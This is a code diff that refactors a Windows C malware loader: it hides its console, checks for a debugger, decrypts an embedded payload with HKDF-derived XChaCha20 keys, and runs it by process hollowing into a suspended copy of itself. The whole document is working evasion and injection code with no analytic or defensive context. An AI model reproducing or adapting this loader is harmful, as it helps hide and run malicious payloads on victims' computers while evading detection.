@@ -4,8 +4,41 @@
 #include "crypto/hashing/sha.h"
 #include "crypto/chacha20-poly1305/chacha20poly1305.h"
 
+typedef struct {
+    unsigned char* payload;
+    unsigned char* key;
+    unsigned char* nonce;
+    unsigned long payloadSize;
+    unsigned long keySize;
+    unsigned long nonceSize;
+} Resources;
+
+typedef struct {
+    uint8_t key[32];
+    uint8_t nonce[24];
+    uint8_t hash[32];
+    uint8_t salt[16];
+    uint8_t prk[USHAMaxHashSize];
+    uint8_t okm[80];
+    uint8_t metaNonce[24];
+    uint8_t obfKey[32];
+    uint8_t obfNonce[24];
+} CryptoContext;
+
+typedef struct {
+    void* pe;
+    void* pImageBase;
+    IMAGE_DOS_HEADER* DOSHeader;
+    IMAGE_NT_HEADERS64* NtHeader;
+    IMAGE_SECTION_HEADER* SectionHeader;
+    PROCESS_INFORMATION PI;
+    STARTUPINFOA SI;
+    CONTEXT* CTX;
+    char currentFilePath[MAX_PATH];
+} ProcessContext;
+
 // Function to extract embedded resource from this executable
-unsigned char *GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
+unsigned char* GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
 {
     HGLOBAL hResData;
     HRSRC   hResInfo;
@@ -24,181 +57,182 @@ unsigned char *GetResource(int resourceId, char* resourceType, unsigned long* dw
     return NULL;
 }
 
-int main()
+static int ProcessHollowing(uint8_t* decrypted, unsigned long payloadSize)
 {
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    ProcessContext ctx = {0};
+    ctx.pe = decrypted;
+    ctx.DOSHeader = (PIMAGE_DOS_HEADER)ctx.pe;
+    ctx.NtHeader = (IMAGE_NT_HEADERS64*)((uint8_t*)ctx.pe + ctx.DOSHeader->e_lfanew);
 
-    if (IsDebuggerPresent())
+    if (ctx.NtHeader->Signature != IMAGE_NT_SIGNATURE)
     {
-        OutputDebugStringA("Oops! Unexpected failure.");
         return 1;
     }
 
-    uint8_t key[32] = {0};
-    uint8_t nonce[24] = {0};
-
-
-    /*
-    Payload decryption and key/nonce recovery process:
+    GetModuleFileNameA(NULL, ctx.currentFilePath, MAX_PATH);
     
-    1) Load encrypted payload and obfuscated key & nonce from embedded resources.
-    2) Calculate SHA-256 hash of the encrypted payload.
-    3) Extract first 16 bytes of the hash to be used as HKDF salt.
-    4) Use HKDF with hash and salt to derive 80 bytes of keying material (OKM).
-        - First 32 bytes → key for deobfuscating real key and nonce.
-        - Last 24 bytes  → nonce for deobfuscation context.
-    5) Initialize XChaCha20 context and decrypt the obfuscated key and nonce.
-    6) Allocate memory and copy the encrypted payload.
-    7) Initialize XChaCha20 context with real key/nonce and decrypt the payload in-place.
-    */
-
-    unsigned long payloadSize = 0, keySize = 0, nonceSize = 0;
-    unsigned char* payloadResPtr = GetResource(132, RT_RCDATA, &payloadSize);
-    unsigned char* obfKeyPtr     = GetResource(133, RT_RCDATA, &keySize);
-    unsigned char* obfNoncePtr   = GetResource(134, RT_RCDATA, &nonceSize);
-
-    if ((payloadResPtr == NULL || payloadSize == 0) ||
-        (obfKeyPtr == NULL     || keySize != 32) ||
-        (obfNoncePtr == NULL   || nonceSize != 24))
+    if (!CreateProcessA(ctx.currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &ctx.SI, &ctx.PI))
     {
         return 1;
     }
 
-    // 1) Compute SHA256 of encrypted payload
-    uint8_t hash[32];
-    SHA256Context shaCtx;
-    SHA256Reset(&shaCtx);
-    SHA256Input(&shaCtx, payloadResPtr, payloadSize);
-    SHA256Result(&shaCtx, hash);
+    ctx.CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+    if (!ctx.CTX)
+    {
+        TerminateProcess(ctx.PI.hProcess, 1);
+        return 1;
+    }
 
-    // 2) salt = hash[0..15]
-    uint8_t salt[16];
-    memcpy(salt, hash, 16);
+    ctx.CTX->ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(ctx.PI.hThread, ctx.CTX))
+    {
+        goto cleanup;
+    }
 
-    // 3) HKDF(salt, IKM=hash) → okm[80]
-    HKDFContext hkdfCTX;
-    uint8_t prk[USHAMaxHashSize];
-    uint8_t okm[80];
-    uint8_t metaNonce[24];
-    uint8_t obfKey[32];
-    uint8_t obfNonce[24];
+    ctx.pImageBase = VirtualAllocEx(
+        ctx.PI.hProcess,
+        (LPVOID)(ctx.NtHeader->OptionalHeader.ImageBase),
+        ctx.NtHeader->OptionalHeader.SizeOfImage,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    if (!ctx.pImageBase)
+    {
+        goto cleanup;
+    }
+
+    WriteProcessMemory(ctx.PI.hProcess, ctx.pImageBase, ctx.pe, 
+        ctx.NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+
+    for (size_t i = 0; i < ctx.NtHeader->FileHeader.NumberOfSections; i++)
+    {
+        ctx.SectionHeader = (PIMAGE_SECTION_HEADER)(
+            (uint8_t*)ctx.pe + ctx.DOSHeader->e_lfanew + 
+            sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER))
+        );
+
+        WriteProcessMemory(
+            ctx.PI.hProcess,
+            (LPVOID)((uintptr_t)ctx.pImageBase + ctx.SectionHeader->VirtualAddress),
+            (LPVOID)((uintptr_t)ctx.pe + ctx.SectionHeader->PointerToRawData),
+            ctx.SectionHeader->SizeOfRawData,
+            NULL
+        );
+    }
+
+    WriteProcessMemory(
+        ctx.PI.hProcess,
+        (LPVOID)(ctx.CTX->Rdx + 0x10),
+        &ctx.NtHeader->OptionalHeader.ImageBase,
+        sizeof(uint64_t),
+        NULL
+    );
+
+    ctx.CTX->Rcx = (uintptr_t)ctx.pImageBase + ctx.NtHeader->OptionalHeader.AddressOfEntryPoint;
+    SetThreadContext(ctx.PI.hThread, ctx.CTX);
+    ResumeThread(ctx.PI.hThread);
+    WaitForSingleObject(ctx.PI.hProcess, INFINITE);
+
+    VirtualFree(ctx.CTX, 0, MEM_RELEASE);
+    return 0;
+
+cleanup:
+    if (ctx.CTX)
+    {
+        VirtualFree(ctx.CTX, 0, MEM_RELEASE);
+    }
+    TerminateProcess(ctx.PI.hProcess, 1);
+    return 1;
+}
+
+static void cleanup_resources(Resources* res, CryptoContext* crypto, uint8_t* decrypted, unsigned long payloadSize)
+{
+    if (crypto)
+    {
+        SecureZeroMemory(crypto->key, sizeof(crypto->key));
+        SecureZeroMemory(crypto->nonce, sizeof(crypto->nonce));
+    }
     
-    memset(&hkdfCTX, 0, sizeof(hkdfCTX));
-    if (hkdfReset(&hkdfCTX, SHA256, salt, 16) != 0 ||
-        hkdfInput(&hkdfCTX, hash, 32) != 0 ||
-        hkdfResult(&hkdfCTX, prk, (const uint8_t *)"obfuscation-context", (int)strlen("obfuscation-context"), okm, 80) != 0)
-    {
-        return 1;
-    }
-    memcpy(obfKey, okm, 32);
-    memcpy(metaNonce, okm + 56, 24);
-
-    // 4) Decrypt obfuscated key and nonce using obfKey/metaNonce
-    chacha20poly1305_ctx obfCtx;
-    xchacha20poly1305_init(&obfCtx, obfKey, metaNonce);
-    chacha20poly1305_decrypt(&obfCtx, obfKeyPtr, key, 32);
-    chacha20poly1305_decrypt(&obfCtx, obfNoncePtr, nonce, 24);
-
-    // 5) Decrypt the payload
-    uint8_t* decrypted = (uint8_t*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!decrypted) {
-        return 1;
-    }
-    memcpy(decrypted, payloadResPtr, payloadSize);
-    chacha20poly1305_ctx decCtx;
-    xchacha20poly1305_init(&decCtx, key, nonce);
-    chacha20poly1305_decrypt(&decCtx, decrypted, decrypted, payloadSize);
-
-    // Process hollowing 
-    void* pe = decrypted;
-    IMAGE_DOS_HEADER* DOSHeader = (PIMAGE_DOS_HEADER)pe;
-    IMAGE_NT_HEADERS64* NtHeader = (IMAGE_NT_HEADERS64*)((uint8_t*)pe + DOSHeader->e_lfanew);
-    IMAGE_SECTION_HEADER* SectionHeader;
-
-    PROCESS_INFORMATION PI;
-    STARTUPINFOA SI;
-    ZeroMemory(&PI, sizeof(PI));
-    ZeroMemory(&SI, sizeof(SI));
-
-    void* pImageBase;
-    char currentFilePath[MAX_PATH];
-
-    if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
-    {
-        GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
-
-        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
-        {
-            CONTEXT* CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
-            if (!CTX)
-            {
-                TerminateProcess(PI.hProcess, 1);
-                VirtualFree(decrypted, 0, MEM_RELEASE);
-                return 1;
-            }
-
-            CTX->ContextFlags = CONTEXT_FULL;
-
-            if (GetThreadContext(PI.hThread, CTX))
-            {
-                pImageBase = VirtualAllocEx(
-                    PI.hProcess,
-                    (LPVOID)(NtHeader->OptionalHeader.ImageBase),
-                    NtHeader->OptionalHeader.SizeOfImage,
-                    MEM_COMMIT | MEM_RESERVE,
-                    PAGE_EXECUTE_READWRITE
-                );
-
-                if (pImageBase)
-                {
-                    WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
-
-                    for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
-                    {
-                        SectionHeader = (PIMAGE_SECTION_HEADER)(
-                            (uint8_t*)pe + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER))
-                        );
-
-                        WriteProcessMemory(
-                            PI.hProcess,
-                            (LPVOID)((uintptr_t)pImageBase + SectionHeader->VirtualAddress),
-                            (LPVOID)((uintptr_t)pe + SectionHeader->PointerToRawData),
-                            SectionHeader->SizeOfRawData,
-                            NULL
-                        );
-                    }
-
-                    WriteProcessMemory(
-                        PI.hProcess,
-                        (LPVOID)(CTX->Rdx + 0x10),
-                        &NtHeader->OptionalHeader.ImageBase,
-                        sizeof(uint64_t),
-                        NULL
-                    );
-
-                    CTX->Rcx = (uintptr_t)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
-                    SetThreadContext(PI.hThread, CTX);
-                    ResumeThread(PI.hThread);
-                    WaitForSingleObject(PI.hProcess, INFINITE);
-
-                    VirtualFree(CTX, 0, MEM_RELEASE);
-                    VirtualFree(decrypted, 0, MEM_RELEASE);
-                    return 0;
-                }
-            }
-
-            TerminateProcess(PI.hProcess, 1);
-            VirtualFree(CTX, 0, MEM_RELEASE);
-        }
-    }
-
-    SecureZeroMemory(key, sizeof(key));
-    SecureZeroMemory(nonce, sizeof(nonce));
-
     if (decrypted)
     {
         SecureZeroMemory(decrypted, payloadSize);
         VirtualFree(decrypted, 0, MEM_RELEASE);
     }
+}
+
+int main()
+{
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    if (IsDebuggerPresent()) {
+        OutputDebugStringA("Oops! Unexpected failure.");
+        return 1;
+    }
+
+    Resources res = {0};
+    CryptoContext crypto = {0};
+    uint8_t* decrypted = NULL;
+
+    // Load resources
+    res.payload = GetResource(132, RT_RCDATA, &res.payloadSize);
+    res.key = GetResource(133, RT_RCDATA, &res.keySize);
+    res.nonce = GetResource(134, RT_RCDATA, &res.nonceSize);
+
+    if ((res.payload == NULL || res.payloadSize == 0) ||
+        (res.key == NULL || res.keySize != 32) ||
+        (res.nonce == NULL || res.nonceSize != 24)) {
+        return 1;
+    }
+
+    // Calculate hash and derive keys
+    SHA256Context shaCtx;
+    SHA256Reset(&shaCtx);
+    SHA256Input(&shaCtx, res.payload, res.payloadSize);
+    SHA256Result(&shaCtx, crypto.hash);
+    memcpy(crypto.salt, crypto.hash, 16);
+
+    // HKDF key derivation
+    HKDFContext hkdfCTX;
+    memset(&hkdfCTX, 0, sizeof(hkdfCTX));
+    if (hkdfReset(&hkdfCTX, SHA256, crypto.salt, 16) != 0 ||
+        hkdfInput(&hkdfCTX, crypto.hash, 32) != 0 ||
+        hkdfResult(&hkdfCTX, crypto.prk, (const uint8_t *)"obfuscation-context", 
+            (int)strlen("obfuscation-context"), crypto.okm, 80) != 0)
+    {
+        goto cleanup;
+    }
+
+    memcpy(crypto.obfKey, crypto.okm, 32);
+    memcpy(crypto.metaNonce, crypto.okm + 56, 24);
+
+    // Decrypt key and nonce
+    chacha20poly1305_ctx obfCtx;
+    xchacha20poly1305_init(&obfCtx, crypto.obfKey, crypto.metaNonce);
+    chacha20poly1305_decrypt(&obfCtx, res.key, crypto.key, 32);
+    chacha20poly1305_decrypt(&obfCtx, res.nonce, crypto.nonce, 24);
+
+    // Decrypt payload
+    decrypted = (uint8_t*)VirtualAlloc(NULL, res.payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!decrypted)
+    {
+        goto cleanup;
+    }
+
+    memcpy(decrypted, res.payload, res.payloadSize);
+    chacha20poly1305_ctx decCtx;
+    xchacha20poly1305_init(&decCtx, crypto.key, crypto.nonce);
+    chacha20poly1305_decrypt(&decCtx, decrypted, decrypted, res.payloadSize);
+
+    // Process hollowing and execution
+    int result = ProcessHollowing(decrypted, res.payloadSize);
+    if (result == 0)
+    {
+        cleanup_resources(&res, &crypto, decrypted, res.payloadSize);
+        return 0;
+    }
+
+cleanup:
+    cleanup_resources(&res, &crypto, decrypted, res.payloadSize);
     return 1;
 }
